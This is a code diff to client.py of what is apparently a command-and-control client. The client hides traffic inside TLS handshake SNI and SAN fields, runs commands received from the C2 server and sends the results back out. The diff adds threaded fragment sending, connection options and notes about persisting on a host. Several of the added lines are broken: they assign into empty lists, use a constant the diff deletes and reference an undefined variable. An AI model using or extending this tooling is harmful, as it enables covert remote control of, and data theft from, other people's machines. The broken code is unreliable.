@@ -1,5 +1,11 @@
 # -*- coding: utf-8 -*-
 
+# TODO: for threading:
+#   test if we can open a single TCP/HTTP conn and sending multiple Hellos
+#   .. how will that work ^^ tho when when want to multiplex?
+#   this this sh1t out.
+
+
 """
 client.py
 
@@ -47,7 +53,6 @@ import sys
 
 from protocol import *
 
-NS_TO_MS = 1000000
 MAX_SNI_LEN = 254  # MAX LEN of SNI field value in terms of BYTES
 MAX_TLD_LEN = 4  # Our random TLD generator max char length
 SNI_PADDING_LEN = 3  # To have an RFC Compliant hostname, nodes can be no longer than 63 chars
@@ -57,6 +62,7 @@ POLL_INTERVAL = 10  # seconds for how often we send a heartbeat to the server
 MAX_RETRIES = 5  # Max num of times we will retry sending a message before giving up
 VERBOSE = True
 CLIENT_MODE = "sni"
+THREADS = 1
 
 
 class Session:
@@ -85,7 +91,7 @@ class Session:
         b"",  # [21] unused   -
     ]
 
-    def __init__(self, server=None, proxy=None, test_mode=False):
+    def __init__(self, server=None, proxy=None, test_mode=False, manual_connect=False):
         """
         Establishes a new C2 Session with the server specified.
         Returns an a C2Session instance.
@@ -118,6 +124,8 @@ class Session:
         self.client_id = b""
         self.last_poll_time = 0
         self.message_list = []
+        if manual_connect:
+            return
         init_result = self._connect_init(server, proxy)
         payload = b"_C2CRET_"
         if not init_result:
@@ -248,10 +256,90 @@ class Session:
                         print()
                         print(f" > Got cmd_available: {msg_text}")
                     api_result = API().client_handle(msg_text)
-                    self.send(api_result)
+                    if THREADS > 1:
+                        self.async_send(api_result, THREADS)
+                    else:
+                        self.send(api_result)
                     self.message_list.append(
                         f"RECV < [[ {len(san_payload)} bytes; msg_type={msg_type.hex()}; request= ` {msg_text[:50]} ` ]]"
                     )
+
+    def async_send(self, message: bytes, threads: int) -> bool:
+        """Works just like send() but sends fragements asynchronously"""
+        if not self.is_connected:
+            return False
+        self.is_heartbeat_active = False  # pause our polling thread until we are done sending our msg
+        start_time_ms = self.rtt_ms = int(int(time.time_ns()) / NS_TO_MS)
+        self.bytes_sent = 0
+        max_msg_len = self.mss
+        if len(message.hex()) > len(message) and self.mode == "sni":
+            max_msg_len = int(self.mss / 2)
+        chunks = [message[i : i + max_msg_len] for i in range(0, len(message), max_msg_len)]
+        smuggle = Message()
+        # First chunk our message up into fragments
+        fragments = []
+        for k, v in enumerate(chunks):
+            smuggle.header = self.client_id + ClientMessage.FRAGMENT
+            smuggle.body = (
+                struct.pack(">L", len(chunks)) + struct.pack(">L", k) + struct.pack(">L", smuggle.compute_crc(v))
+            )
+            sni = self._make_sni(v)
+            if self.mode == "sni":
+                self._set_tls_client_hello(smuggle.to_bytes(), sni)
+            else:
+                smuggle.set_payload(v)
+                sni = self._get_random_sni()
+                self._set_tls_client_hello(smuggle.to_bytes(), sni)
+            # if VERBOSE:
+            #     print(f"> HEADERS: {smuggle.to_bytes().hex()}")
+            #     print(f"> SNI: {sni[9:].decode()}")
+            fragments.append(b"".join(self.tls_client_hello))
+
+        # TODO: We have our fragments now, sned them asyncronously
+        threads = []
+        thread_results = []
+        for idx, fragment in enumerate(fragments):
+            threads[idx] = threading.Thread(target=self._async_send, args=(fragment, thread_results, idx))
+            threads[idx].start()
+            self.bytes_sent += len(fragment)
+        # Now check our results
+        for idx in range(len(fragments)):
+            threads[idx].join()
+        was_send_successful = True
+        for idx in range(len(fragments)):
+            if not thread_results[idx]:
+                was_send_successful = False
+                break
+        if not was_send_successful:
+            self.result_msg = "Sending of message failed - One or more fragments failed to send" + str(msg_type)
+            return False
+        # Now send our Final response msg, telling the server we are done sending
+        smuggle.header = self.client_id + ClientMessage.RESPONSE
+        smuggle.body = struct.pack(">L", len(chunks)) + struct.pack(">L", 0) + struct.pack(">L", 0)
+        self._set_tls_client_hello(smuggle.to_bytes(), self._get_random_sni())
+        response = self._send_message()
+        proto_header, san_payload = self._parse_server_hello(response)
+        msg_type = Message().get_msg_type(proto_header)
+        if msg_type != ServerMessage.ACK:
+            self.result_msg = "Server responded with an unexpected message while sending a response msg: " + str(
+                msg_type
+            )
+            return False
+        self.rtt = int((int(time.time_ns()) - start_time_ms) / NS_TO_MS)
+        self.bytes_sent = len(message)
+        msg_text = ""
+        try:
+            msg_text = message.decode().replace("\n", "\\n")
+        except:
+            msg_text = message.hex()
+        ellipse = ""
+        if len(msg_text) > 65:
+            ellipse = "...[truncated]"
+        self.message_list.append(
+            f"SEND > [[ {self.bytes_sent} bytes; rtt={self.rtt}ms; msg_type={smuggle.get_msg_type(proto_header).hex()}; response= ` {msg_text[:65]+ellipse} ` ]]"
+        )
+        self.is_heartbeat_active = True
+        return True
 
     def send(self, message: bytes) -> bool:
         """This is our abstracted sender method
@@ -305,9 +393,6 @@ class Session:
             if self.mode == "sni":
                 self._set_tls_client_hello(smuggle.to_bytes(), sni)
             else:
-                ###
-                ### TODO: There is a bug here!!! If our payload does not fit neatly into our 16 bytes payload field, then what!@?
-                ###
                 smuggle.set_payload(v)
                 sni = self._get_random_sni()
                 self._set_tls_client_hello(smuggle.to_bytes(), sni)
@@ -531,6 +616,23 @@ class Session:
         self.rtt = int((int(time.time_ns()) - start) / NS_TO_MS)
         return response_data
 
+    def _async_send(self, fragment, results, result_index) -> None:
+        """
+        Sends a msg to the C2 server ASYNCH
+        Remember that our overall TCP/TLS connection is STATELESS
+        We are wrapping this stateless protocol in our own stateful one.
+        Therefore, every single REQUEST/RESPONSE is stateless to the outside protocol
+        """
+        start = int(time.time_ns())
+        if not self._connect_wrapper():
+            results[result_index] = b""
+            return
+        self.tcp_socket.sendall(fragment)
+        response_data = b""
+        results[result_index] = self.tcp_socket.recv(16384)
+        # So ya, we teardown the TCP socket after every REQ/RESP
+        self.tcp_socket.close()
+
     def _parse_server_hello(self, response_bytes: bytes) -> bytes:
         """Extracts SAN message from response bytes;
         Returns TUPLE of bytes: Our protocol header, and any message that may be present"""
@@ -718,11 +820,18 @@ if __name__ == "__main__":
         help="Print out all request and response sent/rcvd",
     )
     arg_parse.add_argument(
-        "-t",
-        "--test",
+        "-c",
+        "--connection",
         action="store_true",
         required=False,
-        help="Test Connectivity to a C2 Server",
+        help="Test Connection to a C2 Server",
+    )
+    arg_parse.add_argument(
+        "-t",
+        "--threads",
+        metavar="threads",
+        required=False,
+        help="How many threads to run (for multiplexing our send operations): int > 1",
     )
     # Validate the the args provided
     args = arg_parse.parse_args()
@@ -733,6 +842,8 @@ if __name__ == "__main__":
     if args.mode:
         if args.mode.lower() == "seed":
             CLIENT_MODE = "seed"
+    if args.threads:
+        THREADS = args.threads
     proxy = None
     proxy_hostname = proxy_scheme = ""
     proxy_port = 0
@@ -751,14 +862,14 @@ if __name__ == "__main__":
         if not args.direct:
             proxy = proxy_hostname + ":" + str(proxy_port)
     # If we get here, args are valid. Now we setup are C2 Session
-    session = Session(server=args.server.lower(), proxy=proxy, test_mode=args.test)
+    session = Session(server=args.server.lower(), proxy=proxy, test_mode=args.connection)
     #
     # TODO: Make client sessions persist!
     # Which means a client will hash some machine specific attribute and write it to file, etc
     # This so we can persist even if the client crashes or is quit, for example
     #
     # Validate that we have an established session
-    if args.test:
+    if args.connection:
         exit(0)
     if not session.is_connected:
         print(f"[!] Error - Could not establish a C2 Session with the Server. Details: {session.result_msg}")
